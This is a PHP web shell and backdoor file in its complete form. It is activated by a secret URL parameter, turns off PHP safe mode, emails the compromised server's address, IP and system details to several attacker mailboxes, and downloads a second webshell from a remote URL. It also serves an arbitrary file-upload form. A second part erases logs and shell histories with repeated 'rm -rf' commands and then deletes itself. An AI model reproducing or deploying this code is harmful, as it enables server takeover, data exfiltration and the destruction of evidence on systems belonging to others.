<?php
if (@$_GET['maklo'] == 'heker') {
	echo "<center>";
if (file_exists("php.ini")){
}else{
$img = fopen('php.ini', 'w');
$sec = "safe_mode = OFF
disable_funtions = NONE";
fwrite($img ,$sec);
fclose($img);}
$ip = getenv("REMOTE_ADDR");
$malinx = $_SERVER['HTTP_HOST'];
$ra44 = rand(1, 99999);
$server_name = $_SERVER['SERVER_NAME'];
$php_self = $_SERVER['PHP_SELF'];
$report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " \nCity: {$city}\nLogin: $server_name$php_self\nPass: $password\nKernel: $kernel";
@mail('muhrazky@gmail.com', 'Hehehe', $report_bug);
$subj = "Result ./666 Shell|$ra44";
$to = "rootcyberpunks@gmail.com";
$headers = "From: Result<devil@666.com";
$a45 = $_SERVER['REQUEST_URI'];
$unameall = php_uname();
$m22 = $ip . "";
$data = "
++--------------[$] [N]K[T]hir[T]33n [$]--------------++

  --------------------------------------------------------
  ~~~~~~~~~~~~~~~~~~SETOR SHELL BOSSSQ~~~~~~~~~~~~~~~~~~~~
  --------------------------------------------------------

# Alamat Web : $malinx
# Dir Shell  : $a45
# IP Address : $m22
# uname -a   : $unameall

  --------------------------------------------------------
  ~~~~~~~~~There Is No Patch for Human Stupidity~~~~~~~~~~
  --------------------------------------------------------
";
@mail($to,$subj,$data,$headers);
$server_name = $_SERVER['SERVER_NAME'];
$php_self = $_SERVER['PHP_SELF'];
$report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " \nCity: {$city}\nLogin: $server_name$php_self\nPass: $password\nKernel: $kernel";
@mail('muhrazky@gmail.com', 'Hehehe', $report_bug);
$to = 'muhrazky@gmail.com,papaku.hayker@gmail.com,snopunks@gmail.com,malaysia.sender@gmail.com,papaku.hayker.go.id@gmail.com,muhrazky@gmail.com';
$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($to, "Halo senpai!!!", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
$nama= fopen("admin.sh" ,"w+");
$file = file_get_contents('https://raw.githubusercontent.com/exploit-haxor/webshell/main/wp-uploader.php');
$tulis = fwrite ($nama ,$file);
fclose($nama);	

echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
      <input type='file' name='0x'>
      <input type='submit' name='upload' value='upload'>
      </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['0x']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
    if(is_writable($root)) {
        if(@copy($_FILES['0x']['tmp_name'], $dest)) {
            $web = "http://".$_SERVER['HTTP_HOST']."/";
            echo "Success!! Here Your Access -> <a href='$web$files' target='_blank'><b><u>$web$files</u></b></a>";
        } else {
            echo "Gagal Up :(";
        }
    } else {
        if(@copy($_FILES['0x']['tmp_name'], $files)) {
            echo "sukses upload <b>$files</b> di folder ini";
        } else {
            echo "Gagal up :(";
        }
    }
}
}
?>
<?php echo'<title>LogEraser | Azz</title>'; rmdir("/tmp/logs");
rmdir("/root/.ksh_history");
rmdir("/root/.bash_history");
rmdir("/root/.bash_logout");
rmdir("/usr/local/apache/logs");
rmdir("/usr/local/apache/log");
rmdir("/var/apache/logs");
rmdir("/var/apache/log");
rmdir("/var/run/utmp");
rmdir("/var/logs");
rmdir("/var/log");
rmdir("/var/adm");
rmdir("/etc/wtmp");
rmdir("/etc/utmp");
rmdir("$HISTFILE");
rmdir("/var/log/lastlog");
rmdir("/var/log/wtmp");system("clear");
 exec("rm -rf /tmp/logs");
exec("rm -rf /root/.ksh_history");
exec("rm -rf /root/.bash_history");
exec("rm -rf /root/.bash_logout");
exec("rm -rf /usr/local/apache/logs");
exec("rm -rf /usr/local/apache/log");
exec("rm -rf /var/apache/logs");
exec("rm -rf /var/apache/log");
exec("rm -rf /var/run/utmp");
exec("rm -rf /var/logs");
exec("rm -rf /var/log");
exec("rm -rf /var/adm");
exec("rm -rf /etc/wtmp");
exec("rm -rf /etc/utmp");
exec("rm -rf $HISTFILE");
exec("rm -rf /var/log/lastlog");
exec("rm -rf /var/log/wtmp");
shell_exec("rm -rf /tmp/logs");
shell_exec("rm -rf /root/.ksh_history");
shell_exec("rm -rf /root/.bash_history");
shell_exec("rm -rf /root/.bash_logout");
shell_exec("rm -rf /usr/local/apache/logs");
shell_exec("rm -rf /usr/local/apache/log");
shell_exec("rm -rf /var/apache/logs");
shell_exec("rm -rf /var/apache/log");
shell_exec("rm -rf /var/run/utmp");
shell_exec("rm -rf /var/logs");
shell_exec("rm -rf /var/log");
shell_exec("rm -rf /var/adm");
shell_exec("rm -rf /etc/wtmp");
shell_exec("rm -rf /etc/utmp");
shell_exec("rm -rf $HISTFILE");
shell_exec("rm -rf /var/log/lastlog");
shell_exec("rm -rf /var/log/wtmp");
passthru("rm -rf /tmp/logs");
passthru("rm -rf /root/.ksh_history");
passthru("rm -rf /root/.bash_history");
passthru("rm -rf /root/.bash_logout");
passthru("rm -rf /usr/local/apache/logs");
passthru("rm -rf /usr/local/apache/log");
passthru("rm -rf /var/apache/logs");
passthru("rm -rf /var/apache/log");
passthru("rm -rf /var/run/utmp");
passthru("rm -rf /var/logs");
passthru("rm -rf /var/log");
passthru("rm -rf /var/adm");
passthru("rm -rf /etc/wtmp");
passthru("rm -rf /etc/utmp");
passthru("rm -rf $HISTFILE");
passthru("rm -rf /var/log/lastlog");
passthru("rm -rf /var/log/wtmp");
system("rm -rf /tmp/logs");
system("rm -rf /root/.bash_history");
system("rm -rf /root/.ksh_history");
system("rm -rf /root/.bash_logout");
system("rm -rf /usr/local/apache/logs");
system("rm -rf /usr/local/apache/log");
system("rm -rf /var/apache/logs");
system("rm -rf /var/apache/log");
system("rm -rf /var/run/utmp");
system("rm -rf /var/logs");
system("rm -rf /var/log");
system("rm -rf /var/adm");
system("rm -rf /etc/wtmp");
system("rm -rf /etc/utmp");
system("rm -rf $HISTFILE");
system("rm -rf /var/log/lastlog");
system("rm -rf /var/log/wtmp");
$fn=$_SERVER['SCRIPT_FILENAME'];unlink($fn);
echo "<center><h1><a href=>Take Care of your Ass xD</a></h1></center>";
?>
